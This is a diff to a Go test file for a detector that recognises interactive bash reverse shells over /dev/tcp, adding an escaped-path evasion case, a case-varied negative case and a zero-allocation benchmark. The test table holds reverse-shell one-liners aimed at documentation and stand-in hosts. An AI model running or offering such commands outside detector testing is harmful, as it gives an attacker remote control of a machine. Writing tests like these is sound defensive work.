@@ -12,8 +12,10 @@ func TestExactPOSIXInteractiveDevTCPShell(t *testing.T) {
 	}{
 		{"feedback IPv4", `bash -i >& /dev/tcp/192.0.2.8/4444 0>&1`, true},
 		{"feedback hostname", `bash -i >& /dev/tcp/relay.invalid/4444 0>&1`, true},
+		{"escaped literal path", `bash -i >& /de\v/t\cp/relay.invalid/4444 0>&1`, true},
 		{"outbound interactive", `bash -i >& /dev/tcp/192.0.2.8/4444`, true},
 		{"ordinary log", `bash -i >& /tmp/session.log 0>&1`, false},
+		{"case-varied ordinary path", `bash -i >& /DEV/TCP/collector.invalid/443 0>&1`, false},
 		{"null output", `bash -i >& /dev/null 0>&1`, false},
 		{"loopback", `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`, false},
 		{"legacy loopback", `bash -i >& /dev/tcp/127.1/4444 0>&1`, false},
@@ -35,5 +37,17 @@ func TestExactPOSIXInteractiveDevTCPShell(t *testing.T) {
 				t.Fatalf("proof=%t, want %t; facts=%+v", got, test.want, facts)
 			}
 		})
+	}
+}
+
+func TestExactPOSIXInteractiveDevTCPShellBenignRedirectAllocations(t *testing.T) {
+	source := `bash -i >& /tmp/session.log 0>&1`
+	facts := Analyze(Input{Tool: "shell", Command: source})
+	if got := testing.AllocsPerRun(100, func() {
+		if ExactPOSIXInteractiveDevTCPShell(source, facts) {
+			t.Fatal("ordinary redirect proved as a network shell")
+		}
+	}); got != 0 {
+		t.Fatalf("ordinary redirect proof allocated %.0f times per call, want zero", got)
 	}
 }
